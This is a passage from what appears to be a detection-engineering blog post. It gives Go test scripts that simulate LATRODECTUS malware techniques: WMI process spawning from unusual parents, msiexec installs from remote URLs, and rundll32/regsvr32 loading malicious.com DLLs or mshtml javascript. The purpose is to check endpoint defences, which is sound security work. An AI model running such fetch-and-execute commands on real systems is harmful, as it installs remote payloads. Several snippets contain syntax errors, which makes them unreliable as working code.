</span></span><span style="display:flex;"><span>    fileTypes <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;js&#34;</span>, <span style="color:#f1fa8c">&#34;jse&#34;</span>, <span style="color:#f1fa8c">&#34;vbs&#34;</span>, <span style="color:#f1fa8c">&#34;vbe&#34;</span>, <span style="color:#f1fa8c">&#34;wsh&#34;</span>, <span style="color:#f1fa8c">&#34;hta&#34;</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> _, fileType <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> fileTypes {
</span></span><span style="display:flex;"><span>        scriptPath <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;C:\\Temp\\script.%s&#34;</span>, fileType)
</span></span><span style="display:flex;"><span>        scriptContent <span style="color:#ff79c6">:=</span> strings.<span style="color:#50fa7b">Repeat</span>(<span style="color:#f1fa8c">&#34;A&#34;</span>, <span style="color:#bd93f9">30000001</span>) <span style="color:#6272a4">// 30MB + 1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>        file, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Create</span>(scriptPath)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to create script file (%s): %v&#34;</span>. fileType, err))
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">defer</span> file.<span style="color:#50fa7b">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        _, err = file.<span style="color:#50fa7b">WriteString</span>(scriptContent)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to write to script file (%s): %v&#34;</span>, fileType, err))
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// execute script using `cscript.exe`, `wscript.exe`, `mshta.exe`
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;cscript.exe %s&#34;</span>, scriptPath))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;wscript.exe %s&#34;</span>, scriptPath))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;mshta.exe %s&#34;</span>, scriptPath))
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// execute command function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">executeCommand</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;successfully executed command %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;process execution blocked&#34;</span>)
</span></span><span style="display:flex;"><span>            Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> cleanup {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove files
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	fileTypes <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;js&#34;</span>, <span style="color:#f1fa8c">&#34;jse&#34;</span>, <span style="color:#f1fa8c">&#34;vbs&#34;</span>, <span style="color:#f1fa8c">&#34;vbe&#34;</span>, <span style="color:#f1fa8c">&#34;wsh&#34;</span>, <span style="color:#f1fa8c">&#34;hta&#34;</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, fileType <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> fileType {
</span></span><span style="display:flex;"><span>		scriptPath <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;C:\\Temp\\script.%s&#34;</span>, fileType)
</span></span><span style="display:flex;"><span>		err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(scriptPath)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to remove script file %s: %v&#34;</span>, fileType, err))
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;cleanup completed!&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects the presence of unusually large script files being created + executed.</p>
<h3 id="execution-via-suspicious-wmi-client">execution via suspicious WMI client</h3>
<p><code>LATRODECTUS</code> uses WMI to execute processes in a suspicious manner, using parent processes like <code>mshta.exe</code>, <code>excel.exe</code>, and others.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>    effectiveParents <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;excel.exe&#34;</span>, <span style="color:#f1fa8c">&#34;powerpnt.exe&#34;</span>, <span style="color:#f1fa8c">&#34;winword.exe&#34;</span>, <span style="color:#f1fa8c">&#34;mshta.exe&#34;</span>, <span style="color:#f1fa8c">&#34;wscript.exe&#34;</span>, <span style="color:#f1fa8c">&#34;wmic.exe&#34;</span>, <span style="color:#f1fa8c">&#34;rundll32.exe&#34;</span>, <span style="color:#f1fa8c">&#34;regsvr.exe&#34;</span>, <span style="color:#f1fa8c">&#34;msbuild.exe&#34;</span>, <span style="color:#f1fa8c">&#34;InstallUtil.exe&#34;</span>}
</span></span><span style="display:flex;"><span>    parentPaths <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\*&#34;</span>, <span style="color:#f1fa8c">&#34;C:\\ProgramData\\*&#34;</span>, <span style="color:#f1fa8c">&#34;C:\\Users\\*\\AppData\\*&#34;</span>, <span style="color:#f1fa8c">&#34;C:\\Windows\\Microsoft.NET\\*&#34;</span>}
</span></span><span style="display:flex;"><span>    hashExclusions <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;0e692d9d3342fdcab1ce3d61aed0520989a94371e5898edb266c92f1fe11c97f&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;8ee339af3ce1287066881147557dc3b57d1835cbba56b2457663068ed25b7840&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;f27cb78f44fc8f70606be883bbed705bd1dd2c2f8a84a596e5f4924e19068f22&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    executableExclusions <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\WerFault.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Windows\\SysWOW64\\WerFault.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\typeperf.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\AcroTray.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;C:\\Program Files\\Mozilla Firefox\\firefox.exe&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// process starting via WMI with unusual parent
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">for</span> _, parent <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> effectiveParents {
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;C:\\Windows\\System32\\Wbem\\WimPrvSE.exe&#39; -ArgumentList &#39;wmic process call create C:\\Windows\\System32\\cmd.exe&#39; -Wait&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;C:\\Windows\\System32\\cmd.exe&#39; -ArgumentList &#39;/C whoami&#39;&#34;</span>))
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> _, path <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> parentPaths {
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;C:\\Windows\\System32\\Wbem\\WimPrvSE.exe&#39; -ArgumentList &#39;wmic process call create %s\\cmd.exe&#39; -Wait&#34;</span>, path))
</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe Start-Process -FilePath &#39;%s\\cmd.exe&#39; -ArgumentList &#39;/C whoami&#39;&#34;</span>, path))
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects unusual WMI-based process executions when triggered by non-standard parent processes.</p>
<h3 id="remote-file-execution-via-msiexec">remote file execution via <code>MSIEXEC</code></h3>
<p><code>LATRODECTUS</code> abuses <code>msiexec.exe</code> to execute files hosted n remote WebDAV shares.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /q&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe -i http://example.com/test.msi -q&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /PaCKagE http://example.com/test.msi /qn&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /qn&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe -i http://example.com/test.msi /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe -fv http://example.com/test.msi /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /qn /quiet&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;devinit.exe msi-install http://example.com/test.msi&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi /quiet INSTALLDIR=%LOCALAPPDATA%&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msiexec.exe /i http://example.com/test.msi transforms=http://example.com/transform.mst /q&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects the use of <code>msiexec.exe</code> with remote URLs, which is uncommon. it simulates the downloading + execution of potentially malicious files.</p>
<h3 id="rundll32-or-regsvr32-loaded-a-dll-from-unbacked-memory"><code>rundll32</code> or <code>regsvr32</code> loaded a DLL from unbacked memory</h3>
<p><code>LATRODECTUS</code> loads DLLs from unbacked memory regions, using <code>rundll32.exe</code> or <code>regsvr32.exe</code>. these are commonly abused in DLL side-loading attacks.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,Control_RunDLL&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u shell32.dll&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,ShellExec_RunDLL&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe javascript:\&#34;\\..\\mshtml,RunHTMLApplication \&#34;;document.write();Close();&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u javascript:\&#34;\\..\\mshtml,RunHTMLApplication \&#34;;document.write();Close();&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// simulate DLL loading from unbacked memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllLoadingCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> dllLoadingCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNprotected
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects this advanced evasion technique, where the malware tries to execute code from regions in memory that are not tied to any known executable image.</p>
<h3 id="network-module-loaded-from-suspicious-unbacked-memory">network module loaded from suspicious unbacked memory</h3>
<p>the malware&rsquo;s network modules are sometimes loaded from memory regions that aren&rsquo;t backed by any known executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
